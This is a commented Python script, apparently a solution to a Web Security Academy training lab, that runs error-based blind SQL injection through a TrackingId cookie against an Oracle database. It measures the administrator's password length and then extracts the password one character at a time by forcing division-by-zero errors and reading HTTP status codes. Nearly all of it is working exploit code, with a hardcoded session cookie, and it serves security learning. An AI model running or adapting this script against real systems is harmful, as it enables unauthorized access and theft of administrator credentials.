# ORACLE DB – Error-based Blind SQL Injection Script

from pwn import *              # Used for pretty progress logging (log.progress)
import requests, signal, time, pdb, sys, string

# -----------------------------------------
# Graceful Ctrl+C handler
# -----------------------------------------
# Allows us to stop the script cleanly
def def_handler(sig, frame):
    print("\n\n[!] Stopping Process...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# -----------------------------------------
# Target configuration
# -----------------------------------------

# Lab URL (category endpoint where the vulnerable TrackingId cookie is processed)
url = "https://0a7c008e03dce7fb81e2daff00f00042.web-security-academy.net/filter?category=Pets"

# Character set used for brute forcing password characters
# In this lab we know passwords contain only lowercase letters and digits
characters = string.ascii_lowercase + string.digits


def makeRequest():
    # Progress bar for visual feedback
    p1 = log.progress("Starting Blind SQL Injection")
    
    password = ""  # This variable will store the extracted password
    
    # ---------------------------------------------------
    # STEP 1 – Determine the password length
    # ---------------------------------------------------
    # We loop through possible lengths (0–30).
    # The injected payload checks:
    #   LENGTH(password) >= number
    #
    # If TRUE  → we trigger TO_CHAR(1/0) → Oracle throws error → HTTP 500
    # If FALSE → returns empty string → HTTP 200
    #
    # We detect the password length based on the change in status code.

    for number in range(0, 30):
        cookies1 = {
            'TrackingId': "FqKJEiG92xyn595n'||(SELECT CASE WHEN (LENGTH(password)>=%i) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username ='administrator')||'" % (number),
            
            # Valid session cookie required by the lab
            'session': "dXpZkXjzPWVpLhMgQo7huaS8xk40XQqh"
        }

        # Send request with injected cookie
        http = requests.get(url, cookies=cookies1)

        # Show current payload in progress bar
        p1.status(cookies1['TrackingId'])

        # In this lab:
        # - If SQL error occurs → HTTP 500
        # - If no error → HTTP 200
        #
        # When LENGTH(password) >= number becomes FALSE,
        # no error is triggered → status 200
        # That means the real password length is number - 1.
        if http.status_code == 200:
            pass_lenght = number - 1
            break

    print("Password length: %i" % (pass_lenght))

    # ---------------------------------------------------
    # STEP 2 – Extract password character by character
    # ---------------------------------------------------
    p2 = log.progress("Password")

    # SQL substr() in Oracle is 1-based indexing
    for position in range(1, number):

        # Try each possible character from our charset
        for character in characters:

            cookies2 = {
                'TrackingId': "FqKJEiG92xyn595n'||(SELECT CASE WHEN (substr(password,%i,1)='%s') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username ='administrator')||'" % (position, character),
                
                'session': "dXpZkXjzPWVpLhMgQo7huaS8xk40XQqh"
            }

            # Send request with character guess
            r = requests.get(url, cookies=cookies2)

            # Update progress indicators
            p1.status(cookies2['TrackingId'])
            p2.status(password)

            # Debug output (optional)
            print(r.status_code)

            # Logic explanation:
            # If guessed character is CORRECT:
            #     → condition TRUE
            #     → TO_CHAR(1/0) executes
            #     → Oracle throws division-by-zero error
            #     → HTTP 500 returned
            #
            # If guessed character is WRONG:
            #     → condition FALSE
            #     → empty string returned
            #     → HTTP 200
            #
            # So we detect the correct character when we receive HTTP 500.
            if r.status_code == 500:
                password += character  # Append correct character
                break  # Move to next position

    print("The password is: %s" % password)


# Script entry point
if __name__ == "__main__":
    makeRequest()

